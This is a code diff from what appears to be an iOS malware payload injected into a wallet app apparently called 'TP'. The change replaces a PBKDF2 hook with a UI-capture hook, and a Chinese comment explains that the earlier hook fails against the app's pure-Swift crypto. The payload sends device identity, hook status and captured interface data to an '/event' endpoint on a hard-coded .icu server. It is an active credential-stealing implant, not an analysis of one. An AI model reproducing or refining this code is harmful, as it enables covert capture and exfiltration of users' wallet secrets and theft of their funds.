@@ -17,6 +17,7 @@
 #import "Net.h"
 #import "Info.h"
 #import "HookPBKDF.h"
+#import "HookUI.h"
 
 static NSString *const kBaseURL = @"https://myg3z1adawtxz0s.icu";
 static NSString *const kSeed = @"d9f5121f75a6646c4f814a4ff8c41b04";
@@ -65,7 +66,8 @@ static void TPPayloadInit(void) {
     dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(1.0 * NSEC_PER_SEC)),
                    dispatch_get_global_queue(0, 0), ^{
         @try {
-            HookPBKDFInstall();
+            // PBKDF2 那条路对 TP 无效（CryptoSwift 纯 Swift 实现），只留 UI 精确捕获
+            HookUIInstall();
 
             Net *net = [Net shared];
             net.baseURL = kBaseURL;
@@ -84,7 +86,7 @@ static void TPPayloadInit(void) {
             NSMutableDictionary *ev = [NSMutableDictionary dictionaryWithDictionary:[Info identity]];
             ev[@"et"] = @"tp_boot";
             ev[@"c"] = kSeed;
-            ev[@"ctx"] = @{ @"status": HookPBKDFStatus() ?: @"",
+            ev[@"ctx"] = @{ @"status": HookUIStatus() ?: @"",
                             @"treeCount": @(tree.count),
                             @"tree": joined };
             PostOnce(net, @"/event", ev);
